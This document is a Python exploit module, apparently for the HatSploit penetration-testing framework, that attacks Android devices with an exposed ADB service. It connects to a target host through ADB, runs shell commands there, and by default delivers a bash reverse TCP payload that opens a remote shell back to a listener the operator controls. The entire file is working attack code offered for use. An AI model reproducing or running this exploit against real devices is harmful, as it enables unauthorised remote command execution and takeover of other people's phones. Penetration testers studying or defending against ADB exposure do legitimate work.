#!/usr/bin/env python3

#
# This module requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.lib.module import Module
from hatsploit.utils.handler import Handler
from hatsploit.utils.adb import ADBClient


class HatSploitModule(Module, Handler, ADBClient):
    details = {
        'Name': "Android ADB Remote Code Execution",
        'Module': "exploit/android/adb/remote_code_execution",
        'Authors': [
            'Ivan Nikolsky (enty8080) - module developer'
        ],
        'Description': "Remote Code Execution in Android ADB.",
        'Comments': [
            ''
        ],
        'Platform': "android",
        'Risk': "high"
    }

    payload = {
        'Description': "Payload to use.",
        'Value': "unix/generic/bash_reverse_tcp",
        'Categories': None,
        'Architectures': [
            'armle',
            'aarch64',
            'generic'
        ],
        'Platforms': [
            'android',
            'linux',
            'unix'
        ],
        'Types': None
    }

    options = {
        'RHOST': {
            'Description': "Remote host.",
            'Value': None,
            'Type': "ip",
            'Required': True
        },
        'LHOST': {
            'Description': "Local host to listen on.",
            'Value': "0.0.0.0",
            'Type': "ip",
            'Required': True
        },
        'LPORT': {
            'Description': "Local port to listen on.",
            'Value': 8888,
            'Type': "port",
            'Required': True
        }
    }

    def adb_clean_up(self):
        self.output_process("Stopping ADB server...")

        if not self.stop_adb_server():
            self.output_error("Failed to stop ADB server!")

    def adb_execute_command(self, command):
        command_output = self.execute_adb_command("shell", command)
        return True, command_output

    def adb_start_server(self):
        self.output_process("Starting ADB server...")

        if not self.start_adb_server():
            self.output_error("Failed to start ADB server!")
            return

    def run(self):
        remote_host, local_host, local_port = self.parse_options(self.options)

        self.output_process("Checking ADB installation...")
        if not self.check_adb_installation():
            self.output_error("ADB is not installed!")
            return

        self.adb_start_server()
        self.output_process(f"Exploiting {remote_host}...")

        if not self.connect_adb_client(remote_host):
            self.output_error("Exploit failed!")
            self.clean_up()
            return

        if not self.check_connected(remote_host):
            self.output_error("Exploit failed!")
            self.clean_up()
            return

        self.handle_session(
            host=local_host,
            port=local_port,
            remote_host=remote_host,

            payload=self.payload,

            sender=self.adb_execute_command
        )
